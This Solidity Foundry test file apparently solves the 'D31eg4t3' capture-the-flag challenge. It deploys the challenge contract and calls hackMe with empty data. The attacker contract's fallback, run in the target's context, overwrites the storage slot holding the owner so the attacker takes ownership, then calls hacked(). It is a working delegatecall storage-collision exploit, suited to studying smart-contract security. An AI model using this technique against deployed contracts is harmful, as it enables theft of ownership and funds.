// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {D31eg4t3} from "../../src/d31eg4t3/d31eg4t3.sol";

interface ITarget {
    function hackMe(bytes memory data) external;
    function hacked() external;
}

contract D31eg4t3Challenge is Test {
    address targetAddress; // 目标合约地址
    address store_1;
    address store_2;
    address store_3;
    address store_4;
    address owner;

    constructor() {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("d31eg4t3.sol:D31eg4t3")
        );

        address deployedAddress;
        // the owner should be set to tx.origin first
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        require(deployedAddress != address(0), "Deployment failed");

        targetAddress = deployedAddress;
        console.log("Deployed address: %s", deployedAddress);
    }

    function test_pwn() external {
        // not calldata assigned, so the fallback will be invoked
        ITarget(targetAddress).hackMe("");
    }

    fallback() external {
        // change the storage slot of slot 5 to the attacker contract
        owner = address(this);
        // judge the owner to be the attacker contract now?
        // not revert means success
        ITarget(targetAddress).hacked();
    }
}
